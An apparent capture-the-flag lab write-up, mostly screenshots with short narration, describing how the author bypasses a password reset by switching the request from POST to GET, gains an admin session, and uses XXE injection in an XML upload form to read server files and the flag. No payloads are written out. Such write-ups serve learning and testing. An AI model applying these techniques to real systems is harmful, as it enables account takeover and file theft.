![](Images/Pasted%20image%2020240227212415.png)

taking a look at the request we can see that it is a POST request: 

![](Images/Pasted%20image%2020240227212842.png)

looking at the source code for the reset page we can again see an open resetPassword() function: 

![](Images/Pasted%20image%2020240227212926.png)

one thing to note is that it seems like it is using the JSON response from `/api.php/token/...` in the fetch call to the reset page: 

![](Images/Pasted%20image%2020240227213736.png)

we can compare the tokens generated for the default and admin users:

![](Images/Pasted%20image%2020240227213327.png)
![](Images/Pasted%20image%2020240227213405.png)

for now lets try to use HTTP verb tampering on the reset request to see which methods might work 

simply changing the method from POST to GET will result in a successful password change: 

![](Images/Pasted%20image%2020240227214749.png)

this actually modifies the results we see in our page because now we can see an add event function: 

![](Images/Pasted%20image%2020240227215421.png)

also, it is worth noting that our `PHPSESSID` cookie has changed and this functionality is only available with this cookie: 

![](Images/Pasted%20image%2020240227215507.png)

now we can see another upload form but this time it uploads with XML data that we can likely exploit: 

![](Images/Pasted%20image%2020240227215551.png)

we can also see another open script in the source code: 

![](Images/Pasted%20image%2020240227215610.png)

we can see from the UI that our input is displayed back to us, but it might not be too helpful since it is using the `.val()` function: 

![](Images/Pasted%20image%2020240227215718.png)

but even with a simple XXE injection test we can see that using entities will evaluate our input: 

![](Images/Pasted%20image%2020240227220133.png)

we can also read files: 

![](Images/Pasted%20image%2020240227220410.png)

looking for the /flag.php file we can get a result and using a base64 decoder we can read the flag: 

![](Images/Pasted%20image%2020240227225448.png)
